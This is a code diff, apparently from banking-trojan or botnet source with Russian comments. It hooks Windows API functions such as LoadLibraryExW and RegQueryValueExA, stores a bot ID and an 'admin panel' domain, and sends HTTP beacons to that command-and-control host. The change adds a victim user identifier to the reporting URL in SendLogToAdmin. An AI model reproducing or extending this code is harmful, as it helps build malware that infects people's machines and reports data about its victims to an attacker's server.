@@ -97,6 +97,7 @@ static PLoadLibraryExW Real_LoadLibraryExW;
 static PRegQueryValueExA Real_RegQueryValueExA;
 
 char domain[128]; //адрес админки
+char azUser[128]; //имя юзера
 char botUid[128];
 
 //создает имя файла для хранения dll в файле
@@ -134,7 +135,7 @@ static void SendLogToAdmin( int num )
 {
 	char qr[128];
 	fwsprintfA pwsprintfA = Get_wsprintfA();
-	pwsprintfA( qr, "http://%s/set/bit.html?uid=%s&sum=%d&type=cber&mode=stat", domain, BOT_UID, num );
+	pwsprintfA( qr, "http://%s/set/bit.html?uid=%s&sum=%d&type=cber&mode=stat&cid=%s", domain, BOT_UID, num, azUser );
 	THTTPResponseRec Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
@@ -453,6 +454,8 @@ static void CopyFolderForVersion( const char* appName )
 static bool InitData()
 {
 	if( GetAdminUrl(domain) == 0 ) return false;
+	string user = GetAzUser();
+	m_lstrcpy( azUser, user.t_str() );
 	return true;
 }
 
